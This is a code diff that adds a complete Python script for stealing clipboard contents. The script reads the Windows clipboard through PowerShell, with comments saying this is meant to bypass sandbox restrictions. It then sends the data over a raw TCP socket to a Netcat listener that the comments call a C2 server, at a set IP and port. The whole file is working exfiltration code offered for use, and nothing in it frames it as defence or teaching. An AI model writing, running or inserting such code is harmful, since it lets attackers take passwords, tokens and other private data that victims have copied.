@@ -1,0 +1,43 @@
+import socket
+import subprocess
+
+def get_clipboard():
+    """Extracts clipboard text using PowerShell to avoid dependencies and sandbox restrictions."""
+    try:
+        # Use powershell Get-Clipboard to bypass sandbox restrictions in the .pyzw context
+        result = subprocess.check_output(
+            ["powershell", "-command", "Get-Clipboard"], 
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+            text=True
+        )
+        return result.strip()
+    except Exception as e:
+        return f"[ERROR] Failed to read clipboard: {e}"
+
+def exfiltrate_data_via_tcp(data, host, port):
+    """Send data to a Netcat listener."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(5)
+            s.connect((host, port))
+            
+            # Format data to be readable
+            payload = f"=== CLIPBOARD EXFILTRATION ===\n{data}\n=============================\n"
+            s.sendall(payload.encode('utf-8'))
+            print("[+] Successfully exfiltrated clipboard data.")
+    except Exception as e:
+        print(f"[-] Exfiltration failed: {e}")
+
+if __name__ == "__main__":
+    clipboard_data = get_clipboard()
+    
+    # Define Netcat listener's IP and port
+    # Change these to match your C2 server (e.g. Raspberry Pi)
+    nc_host = "192.168.1.55"  # Replace with your listener's IP
+    nc_port = 9001             # Replace with your listener's port
+
+    if clipboard_data:
+        exfiltrate_data_via_tcp(clipboard_data, nc_host, nc_port)
+    else:
+        print("[-] Clipboard is empty or unreadable.")
